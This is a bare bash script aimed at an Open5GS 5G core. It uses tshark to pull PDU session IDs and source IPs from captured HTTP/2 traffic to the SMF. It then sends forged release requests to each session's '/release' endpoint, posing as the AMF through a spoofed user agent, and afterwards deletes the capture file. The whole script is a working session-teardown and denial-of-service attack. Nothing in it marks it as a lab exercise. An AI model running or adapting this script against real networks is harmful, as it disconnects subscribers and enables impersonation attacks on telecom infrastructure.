#!/bin/bash

# File containing tshark output
TSHARK_FILE="/tmp/packet.pcap"

# Run tshark to extract HTTP/2 packets matching the desired URI
tshark -r "$TSHARK_FILE" \
    -o http2.tcp.port:80 \
    -Y 'http2.header.value contains "http://open5gs-smf/nsmf-pdusession/v1/sm-contexts/"' \
    -T fields -e ip.src -e http2.header.value |
while IFS=$'\t' read -r ip_src uri; do
    # Extract the URI field by removing leading/trailing commas and finding the correct value
    clean_uri=$(echo "$uri" | grep -oE 'http://open5gs-smf/nsmf-pdusession/v1/sm-contexts/[0-9]+')

    # Extract the session ID from the cleaned URI
    session_id=$(echo "$clean_uri" | grep -oE '[0-9]+$')

    # Print the results
    if [[ -n "$ip_src" && -n "$session_id" ]]; then
        echo "Source IP: $ip_src, Session ID: $session_id"
    fi

    sleep 10
    curl -vvvv -o /dev/null -w "%{http_code}" --request POST -d '{"ueLocation":{"nrLocation":{"tai":{"plmnId":{"mcc":"208","mnc":"93"},"tac":"000001"},"ncgi":{"plmnId":{"mcc":"208","mnc":"93"},"nrCellId":"000000010"},"ueLocationTimestamp":"2022-11-30T03:19:48.206301Z"}},"ueTimeZone":"-05:00"}' -H "Content-Type: application/json" --http2-prior-knowledge  -A "AMF" http://open5gs-smf/nsmf-pdusession/v1/sm-contexts/$session_id/release
done

rm -f $TSHARK_FILE
